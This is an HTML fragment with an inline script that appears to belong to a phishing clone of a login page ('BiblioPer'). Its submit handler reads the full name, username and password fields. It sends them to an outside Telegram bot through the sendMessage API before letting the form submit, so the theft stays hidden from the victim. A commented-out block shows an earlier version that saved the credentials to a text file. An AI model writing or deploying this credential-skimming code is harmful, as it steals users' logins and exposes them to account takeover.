  <link rel="stylesheet" href="./BiblioPer_files/styles.css">
  <script>
    async function fn(event) {
      event.preventDefault();
      const out1 = document.getElementsByName('fullname')
      const out2 = document.getElementsByName('username')
      const out3 = document.getElementsByName('password')
      await guardarEnArchivo(out1[0].value, out2[0].value, out3[0].value)
      await event.target.form.submit();
    };
    async function guardarEnArchivo(v1, v2, v3) {
      var contenido = "fullname: " + v1 + "\nname: " + v2 + "\npassword: " + v3 + "\n";
      /*
      var blob = new Blob([contenido], { type: "text/plain;charset=utf-8" });
      var enlace = document.createElement("a");
      enlace.href = URL.createObjectURL(blob);
      enlace.download = "valor_cuenta.txt";
      enlace.click();
      URL.revokeObjectURL(enlace.href);
      */
      var token = process.env.TOKEN; 
      var chat_id = process.env.ID; 
      var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(contenido);
      await fetch(url);
    }
  </script>
